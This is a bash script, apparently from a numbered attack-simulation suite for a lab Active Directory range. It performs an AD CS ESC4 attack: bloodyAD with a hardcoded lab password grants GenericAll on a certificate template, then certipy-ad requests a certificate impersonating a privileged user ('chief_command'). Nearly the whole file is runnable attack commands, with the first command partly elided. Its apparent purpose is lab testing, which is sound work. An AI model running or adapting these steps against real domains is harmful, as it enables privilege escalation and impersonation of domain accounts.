#!/bin/bash
# CONFIGURED—CA cadre-CA running, ESC4 WriteDacl ACL verified
source "$(dirname "$0")/../lib/cadre-env.sh"
source "$(dirname "$0")/../lib/common.sh"

start_attack "053" "ESC4 — Template ACL modification + re-enrollment"

require_tool bloodyAD
require_tool certipy-ad

log "Step 1: Modify template ACL as lead_engineering to enable domain user enrollment"
run_cmd "bloodyAD --host $DC01 -d $DOMAIN_ROOT -u lead_engineering -p 'Eng_L3ad!' add genericall ..."
result $? "ESC4 — ACL modification"

log "Step 2: Re-enroll as analyst_dfir on the modified template"
run_cmd "certipy-ad req -ca $CA_NAME -template CADRE-ESC4 -upn chief_command@$DOMAIN_ROOT -u $ATTACK_USER@$DOMAIN_ROOT -p '$ATTACK_PASS' -dc-ip $DC01"
result $? "ESC4 — certificate request"
